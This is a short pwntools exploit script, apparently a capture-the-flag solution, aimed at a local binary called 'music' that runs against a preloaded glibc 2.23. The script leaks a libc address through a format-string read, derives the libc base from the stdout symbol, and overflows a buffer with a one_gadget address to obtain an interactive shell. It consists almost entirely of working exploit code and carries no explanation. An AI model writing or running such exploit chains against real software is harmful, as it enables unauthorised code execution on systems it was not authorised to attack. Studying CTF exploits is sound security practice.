from pwn import *

context.arch = 'amd64'
io = process('./music', env={"LD_PRELOAD": "./libc6_2.23-0ubuntu11.2_amd64.so"})  # 自定义预加载libc.so
e = ELF('./libc6_2.23-0ubuntu11.2_amd64.so')

io.sendline('%5$p')
print(io.recvuntil('0x'))
addr = int(io.recv(12), 16)
print('addr is ', hex(addr))

stdout = e.symbols['_IO_2_1_stdout_']
base = addr - stdout
one = base + 0x45226  # one_gadget

payload = flat('a' * 132, one)
io.sendline(payload)
io.interactive()
